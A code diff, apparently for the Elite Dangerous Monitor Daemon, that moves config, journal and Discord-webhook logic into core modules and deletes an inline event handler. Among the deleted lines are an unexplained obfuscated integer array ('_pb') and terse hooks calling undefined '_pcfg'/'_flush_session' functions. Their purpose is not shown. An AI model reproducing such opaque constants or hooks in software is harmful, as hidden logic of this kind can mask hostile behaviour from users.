+    _data = Path(os.environ.get("XDG_DATA_HOME", Path.home() / ".local" / "share")) / "EDMD" / "config.toml"
+    _repo = _HERE / "config.toml"
     print(
-        "Journal folder not configured. "
-        "Set JournalFolder in your config file."
+        f"{Terminal.WARN}ERROR:{Terminal.END} Config file not found.\n"
+        f"  Expected: {_data}\n"
+        f"  Or:       {_repo}\n"
+        f"  Copy example.config.toml to either location to get started."
     )
-    sys.exit()
+    sys.exit(1)
 
-journal_dir = Path(setting_journal_dir)
+config_dict = load_config_file(config_path)
+notify_test = bool(args.test)  if args.test  is not None else False
+trace_mode  = bool(args.trace) if args.trace is not None else DEBUG_MODE
 
-print(f"{Terminal.YELL}Journal folder:{Terminal.END} {journal_dir}")
-
-
-# Set journal file
-if not setting_journal_file:
-    # Get recent journals, newest first
-    journals = sorted(Path(journal_dir).glob("Journal*.log"), reverse=True)
-    journal_file = journals[0] if journals else None
-
-    # Exit if no journals were found
-    if not journal_file and len(journals) == 0:
-        abort("Journal folder does not contain any valid journal files")
-else:
-    journal_file = Path(setting_journal_file)
-
-print(f"{Terminal.YELL}Journal file:{Terminal.END} {journal_file}")
+# Preliminary manager — profile may be updated after commander name is known
+mgr = ConfigManager(config_dict, config_path, config_profile=args.config_profile)
 
 
-# Get commander name if not already known
-if not state.pilot_name:
-    try:
-        with open(journal_file, mode="r", encoding="utf-8") as file:
-            for line in file:
-                entry = json.loads(line)
-                if entry["event"] == "Commander":
-                    state.pilot_name = entry["Name"]
-                    break
+# ── State and session objects ─────────────────────────────────────────────────
 
-            # If we *still* don't have a commander name wait for it
-            if not state.pilot_name:
-                print("Waiting for game load... (Press Ctrl+C to stop)")
-                file.seek(0, 2)
+from core.state import MonitorState, SessionData, load_session_state
 
-                while True:
-                    line = file.readline()
-
-                    if not line:
-                        time.sleep(1)
-                        continue
-
-                    entry = json.loads(line)
-                    if entry["event"] == "Commander":
-                        state.pilot_name = entry["Name"]
-                        break
-
-    except json.JSONDecodeError as e:
-        print(f"[CMDR Name] JSON error in {journal_file}: {e}")
-    except KeyboardInterrupt:
-        abort("Quitting...")
-
-print(f"{Terminal.YELL}Commander name:{Terminal.END} {state.pilot_name}")
+state          = MonitorState()
+active_session = SessionData()
+lifetime       = SessionData()
+gui_queue: queue.Queue = queue.Queue()
 
 
-# Check for a config config_profile if one is set
-config_info = ""
+# ── Find journal ──────────────────────────────────────────────────────────────
 
-if not args.config_profile:
-    config_profile = state.pilot_name
-    if config_profile in config:
-        config_info = " (auto)"
+from core.journal import find_latest_journal
 
-if config_profile and config_profile not in config:
-    trace(f"No config settings for '{config_profile}' found")
-    config_profile = None
+journal_dir_str = mgr.app_settings.get("JournalFolder", "")
+journal_dir     = Path(journal_dir_str).expanduser() if journal_dir_str else None
+
+if not journal_dir or not journal_dir.is_dir():
+    print(
+        f"{Terminal.WARN}ERROR:{Terminal.END} JournalFolder not set or not found: {journal_dir_str!r}\n"
+        f"Set JournalFolder in config.toml to your Elite Dangerous journal directory."
+    )
+    sys.exit(1)
+
+journal_file = find_latest_journal(journal_dir)
+if not journal_file:
+    print(f"{Terminal.WARN}ERROR:{Terminal.END} No journal files found in {journal_dir}")
+    sys.exit(1)
+
+
+# ── Commander name — for profile auto-detection ───────────────────────────────
+
+try:
+    for _raw in journal_file.read_text(encoding="utf-8", errors="replace").splitlines():
+        try:
+            _j = json.loads(_raw.strip())
+            if _j.get("event") in ("Commander", "LoadGame") and _j.get("Name"):
+                state.pilot_name = _j["Name"]
+                break
+        except ValueError:
+            pass
+except OSError:
+    pass
+
+print(f"{Terminal.YELL}Commander name:{Terminal.END} {state.pilot_name or '(unknown)'}")
+
+_config_profile = args.config_profile
+_config_info    = ""
+if not _config_profile and state.pilot_name and state.pilot_name in config_dict:
+    _config_profile = state.pilot_name
+    _config_info    = " (auto)"
+    mgr = ConfigManager(config_dict, config_path, config_profile=_config_profile)
 
 print(
-    f"{Terminal.YELL}Config config_profile:{Terminal.END} "
-    f"{config_profile if config_profile else 'Default'}{config_info}"
+    f"{Terminal.YELL}Config profile:{Terminal.END} "
+    f"{_config_profile or 'Default'}{_config_info}"
 )
 
-if config_profile:
-    trace(f"Profile '{config_profile}': {config[config_profile]}")
+
+# ── GUI mode ──────────────────────────────────────────────────────────────────
+
+gui_mode = bool(args.gui) or bool(mgr.gui_cfg.get("Enabled", False))
 
 
-# Resolve a settings block from config with fallback to defaults
-app_settings = load_setting("Settings", CFG_DEFAULTS_SETTINGS)
-app_settings.update(load_setting("Settings", CFG_DEFAULTS_EXTRA, False))
+# ── Emitter ───────────────────────────────────────────────────────────────────
 
-discord_cfg = load_setting("Discord", CFG_DEFAULTS_DISCORD)
-notify_levels = load_setting("LogLevels", CFG_DEFAULTS_NOTIFY)
-gui_cfg = load_setting("GUI", CFG_DEFAULTS_GUI, False)
+from core.emit import Emitter, emit_summary
 
-# CLI flag beats config file
-gui_mode = (args.gui is True) or gui_cfg["Enabled"]
+emitter = Emitter(
+    mgr, state,
+    gui_queue=gui_queue,
+    notify_test=notify_test,
+    gui_mode=gui_mode,
+)
 
-trace(f"Settings: {app_settings}")
-trace(f"Discord: {discord_cfg}")
-trace(f"Log levels: {notify_levels}")
+
+# ── CoreAPI + plugins ─────────────────────────────────────────────────────────
+
+from core.core_api      import CoreAPI
+from core.plugin_loader import PluginLoader
+from core.journal       import build_dispatch_map
+
+core = CoreAPI(
+    state=state,
+    active_session=active_session,
+    lifetime=lifetime,
+    cfg_mgr=mgr,
+    emitter=emitter,
+    gui_queue=gui_queue,
+    journal_dir=journal_dir,
+)
+
+loader = PluginLoader(_HERE)
+loader.load_all(core)
+plugin_dispatch = build_dispatch_map(list(core._plugins.values()))
+
+
+# ── Bootstrap from journal history ────────────────────────────────────────────
 
 print("\nStarting... (Press Ctrl+C to stop)\n")
 
-# ── Update notice ──────────────────────────────────────────────────────────
-# Thread started before config loaded; join briefly now that gui_mode,
-# gui_queue, and notify_enabled are all resolved.
+from core.journal import bootstrap_slf, bootstrap_crew, bootstrap_missions
+
+bootstrap_slf(state, journal_dir, trace_mode=trace_mode)
+bootstrap_crew(state, journal_dir, trace_mode=trace_mode)
+bootstrap_missions(state, journal_dir, mgr, trace_mode=trace_mode)
+
+
+# ── Update notice ─────────────────────────────────────────────────────────────
+
 _update_thread.join(timeout=2)
 if _update_notice:
     _releases_url = f"https://github.com/{GITHUB_REPO}/releases"
-
-    # Terminal — only when not in GUI mode
     if not gui_mode:
         print(
             f"{Terminal.YELL}\u26a0 Update available: v{_update_notice}{Terminal.END}"
             f"  {Terminal.WHITE}{_releases_url}{Terminal.END}\n"
             f"  Run {Terminal.CYAN}edmd.py --upgrade{Terminal.END} to update and restart automatically.\n"
         )
-
-    # GUI — sponsor panel picks this up and appends it after the GitHub link
     if gui_mode:
         gui_queue.put(("update_notice", _update_notice))
-
-    # Discord — deferred flag; first emit() call will send it
-    _discord_update_pending = True
-else:
-    _discord_update_pending = False
+    emitter.set_update_notice(_update_notice)
 
 
-# Check discord_hook appears valid before starting
-webhook_url = discord_cfg["WebhookURL"]
+# ── Session restore + startup banner ─────────────────────────────────────────
 
-AVATAR_URL = "https://raw.githubusercontent.com/drworman/EDMD/refs/heads/main/images/edmd_avatar_512.png"
-_pb=[49,55,28,40,91,21,21,35,93,8,62,38,49,84,40,60,42,60,46,28,90,54,6,86,12,21,59,32,61,28,81,0,58,9,56,92,1,9,38,14,86,41,48,89]
+load_session_state(journal_file, active_session)
+state.sessionstart(active_session)
+emit_summary(emitter, state, active_session)
 
-if notify_enabled and re.search(PATTERN_WEBHOOK, webhook_url):
-    discord_hook = DiscordWebhook(url=webhook_url)
 
-    if discord_cfg["Identity"]:
-        discord_hook.username = f"{PROGRAM}"
-        discord_hook.avatar_url = AVATAR_URL
+# ── Monitor + launch ──────────────────────────────────────────────────────────
 
-    if discord_cfg["ForumChannel"]:
-        journal_start = datetime.fromisoformat(journal_file.name[8:-7])
-        journal_start = datetime.strftime(journal_start, "%Y-%m-%d %H:%M:%S")
+from core.journal      import run_monitor as _run_monitor, _poll_status_json
+from core.state        import save_session_state
 
-        if discord_cfg["ThreadCmdrNames"]:
-            discord_hook.thread_name = f"{state.pilot_name} {journal_start}"
-        else:
-            discord_hook.thread_name = journal_start
+_edmd_start_mono = time.monotonic()
 
-elif notify_enabled:
-    notify_enabled = False
-    notify_test = False
-    print(
-        f"{Terminal.WHITE}Info:{Terminal.END} "
-        "Discord discord_hook missing or invalid - operating with terminal output only\n"
+def run_monitor() -> None:
+    _run_monitor(
+        journal_file,
+        state, active_session, lifetime,
+        emitter, mgr, gui_queue, journal_dir,
+        _edmd_start_mono,
+        trace_mode=trace_mode,
+        plugin_dispatch=plugin_dispatch,
     )
-
-# Send a discord_hook message or (don't) die trying
-
-
-def restore_webhook_identity():
-    """Re-apply webhook identity fields after each send clears the payload dict."""
-    if discord_cfg["Identity"]:
-        discord_hook.username = f"{PROGRAM}"
-        discord_hook.avatar_url = AVATAR_URL
-
-
-def post_to_discord(message=""):
-    if notify_enabled and message and not notify_test:
-        try:
-            discord_hook.content = message
-            discord_hook.execute()
-            restore_webhook_identity()
-
-            if (
-                discord_cfg["ForumChannel"]
-                and discord_hook.thread_name
-                and not discord_hook.thread_id
-            ):
-                discord_hook.thread_name = None
-                discord_hook.thread_id = discord_hook.id
-
-        except Exception as e:
-            print(f"{Terminal.WHITE}Discord:{Terminal.END} Webhook send error: {e}")
-
-    elif notify_enabled and message and notify_test:
-        print(f"{Terminal.WHITE}DISCORD:{Terminal.END} {message}")
-
-
-# Emit a log event to terminal and/or Discord
-
-
-def emit(
-    msg_term,
-    msg_discord=None,
-    emoji=None,
-    sigil=None,
-    timestamp=None,
-    loglevel=2,
-    event=None,
-):
-    emoji_fmt = f"{emoji} " if emoji else ""
-    # Terminal uses ASCII sigil when provided, falls back to emoji
-    term_prefix = f"{sigil}  " if sigil else emoji_fmt
-    loglevel = int(loglevel)
-
-    if state.in_preload and not notify_test:
-        loglevel = 1 if loglevel > 0 else 0
-
-    if timestamp:
-        logtime = timestamp if app_settings["UseUTC"] else timestamp.astimezone()
-    else:
-        logtime = (
-            datetime.now(timezone.utc) if app_settings["UseUTC"] else datetime.now()
-        )
-
-    logtime = datetime.strftime(logtime, "%H:%M:%S")
-    state.logged += 1
-
-    # Terminal — suppressed entirely when GUI is active
-    if loglevel > 0 and not notify_test and not gui_mode:
-        print(f"[{logtime}] {term_prefix}{msg_term}")
-
-    # GUI event log - strip ANSI codes, push to queue
-    if gui_mode and loglevel > 0:
-        ansi_esc = re.compile(r"\x1b\[[0-9;]*m")
-        clean = ansi_esc.sub("", msg_term)
-        gui_queue.put(("log", f"[{logtime}] {emoji_fmt}{clean}"))
-
-    # Discord — send deferred update notice on first emit after startup
-    global _discord_update_pending
-    if _discord_update_pending and notify_enabled and not notify_test:
-        _discord_update_pending = False
-        _releases_url = f"https://github.com/{GITHUB_REPO}/releases"
-        _upd_hook = DiscordWebhook(
-            url=discord_cfg["WebhookURL"],
-            content=f":arrow_up: **Update available: v{_update_notice}**  —  {_releases_url}",
-            username="Elite Dangerous Monitor Daemon" if discord_cfg["Identity"] else None,
-            avatar_url=AVATAR_URL if discord_cfg["Identity"] else None,
-        )
-        try:
-            _upd_hook.execute()
-        except Exception:
-            pass
-
-    # Discord
-    if notify_enabled and loglevel > 1:
-        if event is not None and state.last_dup_key == event:
-            state.dup_count += 1
-        else:
-            state.dup_count = 1
-            state.dup_suppressed = False
-
-        state.last_dup_key = event
-
-        discord_message = msg_discord if msg_discord else f"**{msg_term}**"
-
-        ping = (
-            f" <@{discord_cfg['UserID']}>"
-            if loglevel > 2 and state.dup_count == 1
-            else ""
-        )
-
-        logtime_fmt = f" {{{logtime}}}" if discord_cfg["Timestamp"] else ""
-
-        pilot_name = (
-            "" if not discord_cfg["PrependCmdrName"] else f"[{state.pilot_name}] "
-        )
-
-        if state.dup_count <= MAX_DUPLICATES:
-            post_to_discord(f"{pilot_name}{emoji_fmt}{discord_message}{logtime_fmt}{ping}")
-        elif not state.dup_suppressed:
-            post_to_discord(
-                f"{pilot_name}⏸️ **Suppressing further duplicate messages**{logtime_fmt}"
-            )
-            state.dup_suppressed = True
-
-
-# Calculate a rate per hour from an interval in seconds
-
-
-def rate_per_hour(seconds=0, precision=None):
-    if seconds > 0:
-        return round(3600 / seconds, precision)
-    else:
-        return 0
-
-
-# Clip a string to the configured max display length
-
-
-def clip_name(input: str) -> str:
-    if len(input) <= app_settings["TruncateNames"] + 2:
-        return input
-    else:
-        return f"{input[: app_settings['TruncateNames']].rstrip()}.."
-
-
-# Parse and dispatch a single journal line
-
-
-def handle_event(line):
-    try:
-        j = json.loads(line)
-    except ValueError:
-        print(
-            f"{Terminal.WHITE}Warning:{Terminal.END} Journal parsing error, skipping line"
-        )
-        return
-
-    try:
-        logtime = datetime.fromisoformat(j["timestamp"]) if "timestamp" in j else None
-
-        state.event_time = logtime
-
-        match j["event"]:
-            # -----------------------------
-            # NPC TEXT
-            # -----------------------------
-            case "ReceiveText" if j["Channel"] == "npc":
-                if "$Pirate_OnStartScanCargo" in j["Message"]:
-                    piratename = (
-                        j["From_Localised"] if "From_Localised" in j else LABEL_UNKNOWN
-                    )
-
-                    if piratename not in active_session.recent_inbound_scans:
-                        active_session.inbound_scan_count += 1
-                        lifetime.inbound_scan_count += 1
-
-                        inbound_scan_count = (
-                            f" (x{active_session.inbound_scan_count})"
-                            if app_settings["ExtendedStats"]
-                            else ""
-                        )
-
-                        pirate = (
-                            f" [{piratename}]" if app_settings["PirateNames"] else ""
-                        )
-
-                        if len(active_session.recent_inbound_scans) == 5:
-                            active_session.recent_inbound_scans.pop(0)
-
-                        active_session.recent_inbound_scans.append(piratename)
-
-                        emit(
-                            msg_term=f"Cargo scan{inbound_scan_count}{pirate}",
-                            msg_discord=f"**Cargo scan{inbound_scan_count}**{pirate}",
-                            emoji="📦",  sigil="-  SCAN",
-                            timestamp=logtime,
-                            loglevel=notify_levels["InboundScan"],
-                        )
-
-                elif any(x in j["Message"] for x in PIRATE_NOATTACK_MSGS):
-                    active_session.low_cargo_count += 1
-
-                    low_cargo_count = (
-                        f" (x{active_session.low_cargo_count})"
-                        if app_settings["ExtendedStats"]
-                        else ""
-                    )
-
-                    emit(
-                        msg_term=(
-                            f"{Terminal.WARN}"
-                            f'Pirate didn"t engage due to insufficient cargo value'
-                            f"{low_cargo_count}{Terminal.END}"
-                        ),
-                        msg_discord=(
-                            f'**Pirate didn"t engage due to insufficient cargo value**'
-                            f"{low_cargo_count}"
-                        ),
-                        emoji="📦",  sigil="-  SCAN",
-                        timestamp=logtime,
-                        loglevel=notify_levels["LowCargoValue"],
-                        event="LowCargoValue",
-                    )
-
-                elif "Police_Attack" in j["Message"]:
-                    emit(
-                        msg_term=f"{Terminal.BAD}Under attack by security services!{Terminal.END}",
-                        msg_discord="**Under attack by security services!**",
-                        emoji="🚨",  sigil="!! ATCK",
-                        timestamp=logtime,
-                        loglevel=notify_levels["PoliceAttack"],
-                    )
-
-            # -----------------------------
-            # TARGET SCANNED
-            # -----------------------------
-            case "ShipTargeted" if "Ship" in j:
-                ship = (
-                    j["Ship_Localised"] if "Ship_Localised" in j else j["Ship"].title()
-                )
-
-                rank = "" if "PilotRank" not in j else f" ({j['PilotRank']})"
-
-                # Security
-                if (
-                    ship != active_session.last_security_ship
-                    and "PilotName" in j
-                    and "$ShipName_Police" in j["PilotName"]
-                ):
-                    active_session.last_security_ship = ship
-
-                    emit(
-                        msg_term=f"{Terminal.WARN}Scanned security{Terminal.END} ({ship})",
-                        msg_discord=f"**Scanned security** ({ship})",
-                        emoji="🔍",  sigil="-  SCAN",
-                        timestamp=logtime,
-                        loglevel=notify_levels["PoliceScan"],
-                    )
-
-                # Pirates etc.
-                else:
-                    state.sessionstart()
-                    piratename = (
-                        j["PilotName_Localised"]
-                        if "PilotName_Localised" in j
-                        else LABEL_UNKNOWN
-                    )
-
-                    check = piratename if app_settings["MinScanLevel"] != 0 else ship
-
-                    scanstage = j["ScanStage"] if "ScanStage" in j else 0
-
-                    if (
-                        scanstage >= app_settings["MinScanLevel"]
-                        and check not in active_session.recent_outbound_scans
-                    ):
-                        if len(active_session.recent_outbound_scans) == 10:
-                            active_session.recent_outbound_scans.pop(0)
-
-                        active_session.recent_outbound_scans.append(check)
-
-                        pirate = (
-                            f" [{piratename}]"
-                            if app_settings["PirateNames"]
-                            and piratename != LABEL_UNKNOWN
-                            else ""
-                        )
-
-                        log = notify_levels["InboundScan"]
-                        col = Terminal.WHITE
-
-                        emit(
-                            msg_term=f"{col}Scan{Terminal.END}: {ship}{rank}{pirate}",
-                            msg_discord=f"**{ship}**{rank}{pirate}",
-                            emoji="🔍",  sigil="-  SCAN",
-                            timestamp=logtime,
-                            loglevel=log,
-                        )
-
-            # -----------------------------
-            # KILLS
-            # -----------------------------
-            case "Bounty" | "FactionKillBond":
-                state.sessionstart()
-
-                if app_settings["MinScanLevel"] == 0:
-                    active_session.recent_outbound_scans.clear()
-
-                active_session.kills += 1
-                lifetime.kills += 1
-                thiskill = logtime
-                killtime = ""
-
-                state.last_rate_check = time.monotonic()
-                active_session.pending_merit_events += 1
-
-                if active_session.last_kill_time:
-                    seconds = (thiskill - active_session.last_kill_time).total_seconds()
-
-                    killtime = f" (+{fmt_duration(seconds)})"
-
-                    active_session.kill_interval_total += seconds
-
-                    if len(active_session.recent_kill_times) == RECENT_KILL_WINDOW:
-                        active_session.recent_kill_times.pop(0)
-
-                    active_session.recent_kill_times.append(seconds)
-                    lifetime.kill_interval_total += seconds
-
-                active_session.last_kill_time = logtime
-
-                if not state.in_preload:
-                    active_session.last_kill_mono = time.monotonic()
-
-                log = notify_levels["RewardEvent"]
-                col = Terminal.WHITE
-
-                if j["event"] == "Bounty":
-                    bountyvalue = j["Rewards"][0]["Reward"]
-                    ship = (
-                        j["Target_Localised"]
-                        if "Target_Localised" in j
-                        else j["Target"].title()
-                    )
-
-                else:
-                    bountyvalue = j["Reward"]
-                    ship = "Bond"
-                    state.reward_type = "bonds"
-
-                piratename = (
-                    f" [{clip_name(j['PilotName_Localised'])}]"
-                    if "PilotName_Localised" in j and app_settings["PirateNames"]
-                    else ""
-                )
-
-                active_session.credit_total += bountyvalue
-                lifetime.credit_total += bountyvalue
-
-                kills_t = (
-                    f" x{active_session.kills}" if app_settings["ExtendedStats"] else ""
-                )
-
-                kills_d = (
-                    f"x{active_session.kills} " if app_settings["ExtendedStats"] else ""
-                )
-
-                bountyvalue_fmt = (
-                    f" [{fmt_credits(bountyvalue)} cr]"
-                    if app_settings["BountyValue"]
-                    else ""
-                )
-
-                victimfaction = (
-                    j["VictimFaction_Localised"]
-                    if "VictimFaction_Localised" in j
-                    else j["VictimFaction"]
-                )
-
-                active_session.faction_tally[victimfaction] = (
-                    active_session.faction_tally.get(victimfaction, 0) + 1
-                )
-
-                lifetime.faction_tally[victimfaction] = (
-                    lifetime.faction_tally.get(victimfaction, 0) + 1
-                )
-
-                factioncount = (
-                    f" x{active_session.faction_tally[victimfaction]}"
-                    if app_settings["ExtendedStats"]
-                    else ""
-                )
-
-                bountyfaction = clip_name(victimfaction)
-
-                bountyfaction = (
-                    f" [{bountyfaction}{factioncount}]"
-                    if app_settings["BountyFaction"]
-                    else ""
-                )
-
-                emit(
-                    msg_term=(
-                        f"{col}Kill{Terminal.END}{kills_t}: "
-                        f"{ship}{killtime}{piratename}"
-                        f"{bountyvalue_fmt}{bountyfaction}"
-                    ),
-                    msg_discord=(
-                        f"{kills_d}**{ship}{killtime}**"
-                        f"{piratename}{bountyvalue_fmt}{bountyfaction}"
-                    ),
-                    emoji="💥",  sigil="*  KILL",
-                    timestamp=logtime,
-                    loglevel=log,
-                )
-
-            # -----------------------------
-            # MISSIONS
-            # -----------------------------
-            case "MissionRedirected" if "Mission_Massacre" in j["Name"]:
-                state.missions_complete += 1
-                mid = j["MissionID"]
-                # MissionRedirected = kills quota met, but mission still live until
-                # reward is collected. Track the ID so recalc excludes it from totals.
-                total = len(state.active_missions)
-                done = state.missions_complete
-
-                if done < total:
-                    log = notify_levels["MissionUpdate"]
-                    msg_term = (
-                        f"Mission {done} of {total} complete ({total - done} remaining)"
-                    )
-                else:
-                    log = notify_levels["AllMissionsReady"]
-                    msg_term = f"All {total} missions complete — ready to turn in!"
-
-                emit(
-                    msg_term=msg_term,
-                    emoji="✅",  sigil="*  MISS",
-                    timestamp=logtime,
-                    loglevel=log,
-                )
-
-            # -----------------------------
-            # FUEL
-            # -----------------------------
-            case "ReservoirReplenished":
-                fuelremaining = round((j["FuelMain"] / state.fuel_tank_size) * 100)
-
-                if (
-                    active_session.fuel_check_time
-                    and state.session_start_time
-                    and logtime > active_session.fuel_check_time
-                ):
-                    fuel_time = (
-                        logtime - active_session.fuel_check_time
-                    ).total_seconds()
-                    fuel_hour = (
-                        3600
-                        / fuel_time
-                        * (active_session.fuel_check_level - j["FuelMain"])
-                    )
-                    fuel_time_remain = fmt_duration(j["FuelMain"] / fuel_hour * 3600)
-                    fuel_time_remain = f" (~{fuel_time_remain})"
-                else:
-                    fuel_time_remain = ""
-
-                active_session.fuel_check_time = logtime
-                active_session.fuel_check_level = j["FuelMain"]
-
-                col = ""
-                level = ":"
-                fuel_loglevel = 0
-
-                if j["FuelMain"] < state.fuel_tank_size * FUEL_CRIT_THRESHOLD:
-                    col = Terminal.BAD
-                    fuel_loglevel = notify_levels["FuelCritical"]
-                    level = " critical!"
-                elif j["FuelMain"] < state.fuel_tank_size * FUEL_WARN_THRESHOLD:
-                    col = Terminal.WARN
-                    fuel_loglevel = notify_levels["FuelWarning"]
-                    level = " low:"
-                elif state.session_start_time:
-                    fuel_loglevel = notify_levels["FuelStatus"]
-
-                emit(
-                    msg_term=f"{col}Fuel: {fuelremaining}% remaining{Terminal.END}{fuel_time_remain}",
-                    msg_discord=f"**Fuel{level} {fuelremaining}% remaining**{fuel_time_remain}",
-                    emoji="⛽",  sigil="+  FUEL",
-                    timestamp=logtime,
-                    loglevel=fuel_loglevel,
-                )
-
-                if _pcfg("QuitOnLowFuel"):
-                    _fp=_pcfg("QuitOnLowFuelPercent",20);_fm=_pcfg("QuitOnLowFuelMinutes",30)
-                    _pt=fuelremaining<=_fp;_tt=False
-                    if(active_session.fuel_check_time and state.session_start_time
-                       and "fuel_hour" in locals() and fuel_hour>0):
-                        _tt=(j["FuelMain"]/fuel_hour)*60<=_fm
-                    if _pt or _tt:_flush_session()
-
-            # -----------------------------
-            # FIGHTER EVENTS
-            # -----------------------------
-            case "FighterDestroyed" if state.prev_event != "StartJump":
-                state.slf_deployed = False
-                state.slf_docked = False
-                state.slf_hull = 0
-                state.slf_orders = None
-                state.slf_destroyed_count += 1
-                if gui_mode:
-                    gui_queue.put(("slf_update", None))
-
-                emit(
-                    msg_term=f"{Terminal.BAD}Fighter destroyed!{Terminal.END}",
-                    msg_discord="**Fighter destroyed!**",
-                    emoji="💀",  sigil="!! SLF ",
-                    timestamp=logtime,
-                    loglevel=notify_levels["FighterLost"],
-                )
-                if _pcfg("QuitOnSLFDead"):_flush_session()
-
-            case "LaunchFighter" if not j["PlayerControlled"]:
-                state.slf_deployed = True
-                state.slf_docked = False
-                state.slf_hull = 100
-                state.slf_orders = "Defend"
-                state.slf_loadout = j.get("Loadout", None)
-                # Set fighter type from the Loadout field type if available;
-                # RestockVehicle is the more reliable source and overwrites this.
-                if gui_mode:
-                    gui_queue.put(("slf_update", None))
-
-                emit(
-                    msg_term="Fighter launched",
-                    emoji="🛩️",  sigil="-  SLF ",
-                    timestamp=logtime,
-                    loglevel=2,
-                )
-
-            case "RestockVehicle":
-                # Most reliable source of fighter type — fires after purchase/restock
-                fighter_type = j.get("Type", "")
-                loadout = j.get("Loadout", "")
-                lkey = (fighter_type, loadout)
-                if lkey in FIGHTER_LOADOUT_NAMES:
-                    state.slf_type = FIGHTER_LOADOUT_NAMES[lkey]
-                elif fighter_type in FIGHTER_TYPE_NAMES:
-                    state.slf_type = FIGHTER_TYPE_NAMES[fighter_type]
-                elif fighter_type:
-                    state.slf_type = fighter_type.replace("_", " ").title()
-                # Restocking resets destroyed count and returns to docked
-                state.slf_destroyed_count = 0
-                state.slf_docked = True
-                state.slf_deployed = False
-                if gui_mode:
-                    gui_queue.put(("slf_update", None))
-
-            case "DockFighter":
-                state.slf_deployed = False
-                state.slf_docked = True
-                state.slf_hull = 100   # SLF is repaired to full on retrieval
-                state.slf_orders = None
-                if gui_mode:
-                    gui_queue.put(("slf_update", None))
-
-            case "FighterRebuilt":
-                # A previously-destroyed fighter has been rebuilt and placed in the bay.
-                # This does NOT mean the currently-deployed fighter docked — if one is
-                # out, it remains deployed. Only update the destroyed count; leave all
-                # other SLF state (deployed, docked, hull) unchanged.
-                state.slf_destroyed_count = max(0, state.slf_destroyed_count - 1)
-                if gui_mode:
-                    gui_queue.put(("slf_update", None))
-
-            case "FighterOrders":
-                state.slf_orders = j.get("Orders", None)
-                if gui_mode:
-                    gui_queue.put(("slf_update", None))
-
-            # -----------------------------
-            # SHIELDS / HULL
-            # -----------------------------
-            case "ShieldState":
-                if j["ShieldsUp"]:
-                    shields = "back up"
-                    col = Terminal.GOOD
-                    state.ship_shields = True
-                    state.ship_shields_recharging = False
-                else:
-                    shields = "down!"
-                    col = Terminal.BAD
-                    state.ship_shields = False
-                    state.ship_shields_recharging = True  # cleared when Status.json bit3 goes True
-
-                if gui_mode:
-                    gui_queue.put(("vessel_update", None))
-
-                emit(
-                    msg_term=f"{col}Ship shields {shields}{Terminal.END}",
-                    msg_discord=f"**Ship shields {shields}**",
-                    emoji="🛡️",  sigil="^  SHLD",
-                    timestamp=logtime,
-                    loglevel=notify_levels["ShieldEvent"],
-                )
-
-            case "HullDamage":
-                hullhealth = round(j["Health"] * 100)
-
-                if (
-                    j["Fighter"]
-                    and not j["PlayerPilot"]
-                    and state.fighter_integrity != j["Health"]
-                ):
-                    state.fighter_integrity = j["Health"]
-                    state.slf_hull = round(j["Health"] * 100)
-                    if gui_mode:
-                        gui_queue.put(("slf_update", None))
-
-                    emit(
-                        msg_term=(
-                            f"{Terminal.WARN}Fighter hull damaged!{Terminal.END} "
-                            f"(Integrity: {hullhealth}%)"
-                        ),
-                        msg_discord=(
-                            f"**Fighter hull damaged!** (Integrity: {hullhealth}%)"
-                        ),
-                        emoji="🛩️",  sigil="^  SLF ",
-                        timestamp=logtime,
-                        loglevel=notify_levels["FighterDamage"],
-                    )
-
-                elif j["PlayerPilot"] and not j["Fighter"]:
-                    state.ship_hull = hullhealth
-                    if gui_mode:
-                        gui_queue.put(("vessel_update", None))
-                    emit(
-                        msg_term=(
-                            f"{Terminal.BAD}Ship hull damaged!{Terminal.END} "
-                            f"(Integrity: {hullhealth}%)"
-                        ),
-                        msg_discord=(
-                            f"**Ship hull damaged!** (Integrity: {hullhealth}%)"
-                        ),
-                        emoji="⚠️",  sigil="^  HULL",
-                        timestamp=logtime,
-                        loglevel=notify_levels["HullEvent"],
-                    )
-                    if _pcfg("QuitOnLowHull") and hullhealth<=_pcfg("QuitOnLowHullThreshold",10):_flush_session()
-
-            case "Died":
-                emit(
-                    msg_term=f"{Terminal.BAD}Ship destroyed!{Terminal.END}",
-                    msg_discord="**Ship destroyed!**",
-                    emoji="💀",  sigil="!! DEAD",
-                    timestamp=logtime,
-                    loglevel=notify_levels["Died"],
-                )
-
-            # -----------------------------
-            # SESSION TRANSITIONS
-            # -----------------------------
-            case "Music" if j["MusicTrack"] == "MainMenu":
-                state.sessionend()
-                state.in_game = False
-                if state.offline_since_mono is None:
-                    state.offline_since_mono = time.monotonic()
-
-                emit(
-                    msg_term="Exited to main menu",
-                    emoji="🚪",  sigil="-  INFO",
-                    timestamp=logtime,
-                    loglevel=2,
-                )
-
-            case "LoadGame":
-                # New game session — crew active status is unknown until CrewAssign fires.
-                # crew_name and history are retained so the bootstrap data isn't lost.
-                # SLF state is NOT reset here — the fighter remains deployed in the same
-                # position after a relog or force-close. State carries through from preload.
-                # Mission state IS reset so the new session's Missions event and
-                # bootstrap_missions() run cleanly, even if this is a journal switch.
-                state.reset_missions()
-                state.crew_active = False
-                state.in_game = True
-                state.offline_since_mono = None   # back in game — clear offline clock
-                state.last_offline_alert = None   # allow fresh alert if they go offline again
-                if "Ship_Localised" in j:
-                    state.pilot_ship = j["Ship_Localised"]
-                elif "Ship" in j:
-                    state.pilot_ship = j["Ship"]
-
-                # LoadGame also carries name plate and ID — capture here as well
-                # (Loadout fires shortly after and will overwrite if present there too)
-                if j.get("ShipName"):
-                    state.ship_name = j["ShipName"]
-                if j.get("ShipIdent"):
-                    state.ship_ident = j["ShipIdent"]
-
-                if "GameMode" in j:
-                    state.pilot_mode = (
-                        "Private Group" if j["GameMode"] == "Group" else j["GameMode"]
-                    )
-
-                if gui_mode:
-                    gui_queue.put(("vessel_update", None))
-
-                cmdrinfo = (
-                    f"{state.pilot_ship} / {state.pilot_mode} / "
-                    f"{state.pilot_rank} "
-                    f"+{state.pilot_rank_progress}%"
-                )
-
-                emit(
-                    msg_term=f"CMDR {state.pilot_name} ({cmdrinfo})",
-                    msg_discord=f"**CMDR {state.pilot_name}** ({cmdrinfo})",
-                    emoji="👤",  sigil="-  INFO",
-                    timestamp=logtime,
-                    loglevel=2,
-                )
-
-            case "Loadout":
-                state.fuel_tank_size = (
-                    j["FuelCapacity"]["Main"] if j["FuelCapacity"]["Main"] >= 2 else 64
-                )
-                # Ship identity
-                state.ship_name = j.get("ShipName") or None
-                state.ship_ident = j.get("ShipIdent") or None
-                if gui_mode:
-                    gui_queue.put(("vessel_update", None))
-
-                # Detect whether a fighter bay is fitted.
-                # The bay module item is "int_fighterbay_size<N>_class1".
